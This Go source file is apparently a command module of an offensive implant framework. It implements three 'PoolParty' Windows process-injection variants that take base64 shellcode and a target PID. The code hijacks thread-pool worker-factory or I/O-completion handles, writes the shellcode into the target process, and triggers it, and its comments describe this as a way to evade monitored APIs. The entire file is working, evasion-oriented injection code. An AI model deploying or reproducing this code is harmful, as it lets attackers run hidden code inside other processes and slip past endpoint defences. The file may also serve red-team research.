//go:build windows
// +build windows

// Package commands provides the poolparty-injection command for Thread Pool-based process injection.
//
// This command implements PoolParty injection techniques based on SafeBreach Labs research.
// Currently supported variants:
//   - Variant 1: Worker Factory Start Routine Overwrite
//   - Variant 2: TP_WORK Insertion
//   - Variant 7: TP_DIRECT Insertion (via I/O Completion Port)
//
// These techniques abuse Windows Thread Pool internals to achieve code execution
// without calling CreateRemoteThread or similar monitored APIs.
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolParty-specific constants
const (
	// Process access rights
	PROCESS_DUP_HANDLE = 0x0040

	// Worker factory access rights
	WORKER_FACTORY_RELEASE_WORKER    = 0x0001
	WORKER_FACTORY_WAIT              = 0x0002
	WORKER_FACTORY_SET_INFORMATION   = 0x0004
	WORKER_FACTORY_QUERY_INFORMATION = 0x0008
	WORKER_FACTORY_READY_WORKER      = 0x0010
	WORKER_FACTORY_SHUTDOWN          = 0x0020
	WORKER_FACTORY_ALL_ACCESS        = windows.STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_RELEASE_WORKER | WORKER_FACTORY_WAIT | WORKER_FACTORY_SET_INFORMATION | WORKER_FACTORY_QUERY_INFORMATION | WORKER_FACTORY_READY_WORKER | WORKER_FACTORY_SHUTDOWN

	// I/O Completion access rights
	IO_COMPLETION_QUERY_STATE  = 0x0001
	IO_COMPLETION_MODIFY_STATE = 0x0002
	IO_COMPLETION_ALL_ACCESS   = windows.STANDARD_RIGHTS_REQUIRED | IO_COMPLETION_QUERY_STATE | IO_COMPLETION_MODIFY_STATE

	// Worker factory info classes
	WorkerFactoryBasicInformation = 7
	WorkerFactoryThreadMinimum    = 4

	// Process info class for handle enumeration
	ProcessHandleInformation = 51

	// Object info class
	ObjectTypeInformation = 2

	// Thread pool callback priorities
	TP_CALLBACK_PRIORITY_HIGH   = 0
	TP_CALLBACK_PRIORITY_NORMAL = 1
	TP_CALLBACK_PRIORITY_LOW    = 2

	// Memory protection (PAGE_READWRITE is in vanillainjection.go)
	PAGE_EXECUTE_READWRITE = 0x40
)

// WORKER_FACTORY_BASIC_INFORMATION structure
type WORKER_FACTORY_BASIC_INFORMATION struct {
	Timeout                  int64
	RetryTimeout             int64
	IdleTimeout              int64
	Paused                   uint8
	TimerSet                 uint8
	QueuedToExWorker         uint8
	MayCreate                uint8
	CreateInProgress         uint8
	InsertedIntoQueue        uint8
	Shutdown                 uint8
	_                        uint8 // padding
	BindingCount             uint32
	ThreadMinimum            uint32
	ThreadMaximum            uint32
	PendingWorkerCount       uint32
	WaitingWorkerCount       uint32
	TotalWorkerCount         uint32
	ReleaseCount             uint32
	InfiniteWaitGoal         int64
	StartRoutine             uintptr
	StartParameter           uintptr
	ProcessId                windows.Handle
	StackReserve             uintptr
	StackCommit              uintptr
	LastThreadCreationStatus int32
	_                        [4]byte // padding
}

// PROCESS_HANDLE_TABLE_ENTRY_INFO structure
type PROCESS_HANDLE_TABLE_ENTRY_INFO struct {
	HandleValue      windows.Handle
	HandleCount      uintptr
	PointerCount     uintptr
	GrantedAccess    uint32
	ObjectTypeIndex  uint32
	HandleAttributes uint32
	Reserved         uint32
}

// PROCESS_HANDLE_SNAPSHOT_INFORMATION structure (variable size)
type PROCESS_HANDLE_SNAPSHOT_INFORMATION struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	// Handles array follows
}

// PUBLIC_OBJECT_TYPE_INFORMATION structure
type PUBLIC_OBJECT_TYPE_INFORMATION struct {
	TypeName windows.NTUnicodeString
	Reserved [22]uint32
}

// LIST_ENTRY structure
type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

// TP_TASK_CALLBACKS structure
type TP_TASK_CALLBACKS struct {
	ExecuteCallback uintptr
	Unposted        uintptr
}

// TP_TASK structure
type TP_TASK struct {
	Callbacks      uintptr // Pointer to TP_TASK_CALLBACKS
	NumaNode       uint32
	IdealProcessor uint8
	_              [3]byte
	ListEntry      LIST_ENTRY
}

// TP_DIRECT structure - used for variant 7
type TP_DIRECT struct {
	Task                        TP_TASK
	Lock                        uint64
	IoCompletionInformationList LIST_ENTRY
	Callback                    uintptr
	NumaNode                    uint32
	IdealProcessor              uint8
	_                           [3]byte
}

// TPP_WORK_STATE union (represented as uint32)
type TPP_WORK_STATE struct {
	Exchange uint32
}

// Simplified TPP_CLEANUP_GROUP_MEMBER - only the fields we need
type TPP_CLEANUP_GROUP_MEMBER struct {
	_                  [8]byte   // Refcount
	_                  [8]byte   // padding
	VFuncs             uintptr   // VFuncs pointer
	CleanupGroup       uintptr   // CleanupGroup pointer
	CleanupGroupCancel uintptr   // CleanupGroupCancelCallback
	Finalization       uintptr   // FinalizationCallback
	CleanupGroupLinks  LIST_ENTRY // CleanupGroupMemberLinks
	_                  [64]byte  // CallbackBarrier
	Callback           uintptr   // Union of various callbacks
	Context            uintptr
	ActivationContext  uintptr
	SubProcessTag      uintptr
	ActivityId         [16]byte  // GUID
	WorkOnBehalfTicket [8]byte   // ALPC ticket
	RaceDll            uintptr
	Pool               uintptr   // Pointer to FULL_TP_POOL
	PoolObjectLinks    LIST_ENTRY
	Flags              uint32    // Union flags/longfunction/etc
	_                  [4]byte   // padding
	_                  [16]byte  // AllocCaller
	_                  [16]byte  // ReleaseCaller
	CallbackPriority   int32
	_                  [4]byte   // padding
}

// FULL_TP_WORK structure
type FULL_TP_WORK struct {
	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
	Task               TP_TASK
	WorkState          TPP_WORK_STATE
	_                  [4]byte // padding
}

// TPP_QUEUE structure (simplified)
type TPP_QUEUE struct {
	Queue LIST_ENTRY
	_     [40]byte // RTL_SRWLOCK and other fields
}

// FULL_TP_POOL structure (simplified - only fields we need)
type FULL_TP_POOL struct {
	_         [16]byte     // Refcount and padding
	_         [8]byte      // QueueState
	TaskQueue [3]uintptr   // Array of pointers to TPP_QUEUE
	_         [1024]byte   // Rest of the structure (we don't need these fields)
}

// NT API procedures
var (
	ntdll                                 = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryInformationWorkerFactory   = ntdll.NewProc("NtQueryInformationWorkerFactory")
	procNtSetInformationWorkerFactory     = ntdll.NewProc("NtSetInformationWorkerFactory")
	procNtQueryInformationProcess         = ntdll.NewProc("NtQueryInformationProcess")
	procNtQueryObject                     = ntdll.NewProc("NtQueryObject")
	procZwSetIoCompletion                 = ntdll.NewProc("ZwSetIoCompletion")
	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 2:
		output, err = executeVariant2(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 1: Worker Factory Start Routine Overwrite\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartRoutine,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant2 implements TP_WORK Insertion
func executeVariant2(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 4: Read target process's TP_POOL structure
	var targetTpPool FULL_TP_POOL
	var bytesRead uintptr
	ret, _, err := procReadProcessMemory.Call(
		uintptr(hProcess),
		workerFactoryInfo.StartParameter,
		uintptr(unsafe.Pointer(&targetTpPool)),
		uintptr(unsafe.Sizeof(targetTpPool)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
	}
	output += "[+] Read target process's TP_POOL structure\n"

	// Step 5: Get high priority task queue address
	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
		return output, fmt.Errorf("high priority task queue is NULL")
	}

	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
	var targetQueue TPP_QUEUE
	ret, _, err = procReadProcessMemory.Call(
		uintptr(hProcess),
		targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH],
		uintptr(unsafe.Pointer(&targetQueue)),
		uintptr(unsafe.Sizeof(targetQueue)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
	}
	output += "[+] Read target process's task queue structure\n"

	// Step 6: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 7: Write shellcode
	var bytesWritten uintptr
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (SafeBreach does this)
	pTpWork, _, err := procCreateThreadpoolWork.Call(
		shellcodeAddr, // Work callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWork == 0 {
		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
	}
	output += "[+] Created TP_WORK structure associated with shellcode\n"

	// Step 9: Read and modify the TP_WORK structure
	var tpWork FULL_TP_WORK
	// Copy the structure from our local process
	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
	}

	// Modify: Point Pool to target's TP_POOL
	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
	
	// Modify: Point Flink and Blink to the Queue field address in the target process
	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
	// We need the address of the Queue field within that TPP_QUEUE
	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
	tpWork.Task.ListEntry.Flink = targetQueueListAddr
	tpWork.Task.ListEntry.Blink = targetQueueListAddr
	
	// Set WorkState exactly as SafeBreach does
	tpWork.WorkState.Exchange = 0x2
	output += "[+] Modified TP_WORK structure for insertion\n"

	// Step 10: Allocate memory for TP_WORK in target process
	tpWorkAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpWorkAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)

	// Step 11: Write TP_WORK to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpWorkAddr,
		uintptr(unsafe.Pointer(&tpWork)),
		uintptr(unsafe.Sizeof(tpWork)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)

	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
	
	// Recalculate queue addresses (can't use := since variables already declared)
	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
	
	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr+8 (Blink addr) = 0x%X\n", targetQueueListAddr+8)
	
	// Update the target queue's Flink to point to our TP_WORK
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr, // Address of Queue.Flink
		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
	}
	
	// Update the target queue's Blink to point to our TP_WORK
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), // Address of Queue.Blink
		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
	}
	
	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
	output += "[+] PoolParty Variant 2 injection completed successfully\n"

	return output, nil
}

// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
func executeVariant7(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] PoolParty Variant 7: TP_DIRECT Insertion\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Hijack IoCompletion handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3: Allocate memory for shellcode in target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 4: Write shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 5: Create TP_DIRECT structure
	tpDirect := TP_DIRECT{
		Callback: shellcodeAddr,
	}
	output += "[+] Crafted TP_DIRECT structure with shellcode callback\n"

	// Step 6: Allocate memory for TP_DIRECT in target process
	tpDirectAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpDirectAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	// Step 7: Write TP_DIRECT to target
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpDirectAddr,
		uintptr(unsafe.Pointer(&tpDirect)),
		uintptr(unsafe.Sizeof(tpDirect)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_DIRECT structure (%d bytes)\n", bytesWritten)

	// Step 8: Queue completion packet via ZwSetIoCompletion
	status, _, _ := procZwSetIoCompletion.Call(
		uintptr(hIoCompletion),
		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
		0,            // ApcContext
		0,            // IoStatus
		0,            // IoStatusInformation
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
	}
	output += "[+] Queued packet to I/O completion port\n"
	output += "[+] PoolParty Variant 7 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
func hijackProcessHandle(hProcess windows.Handle, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			uintptr(hProcess),
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			hProcess,
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
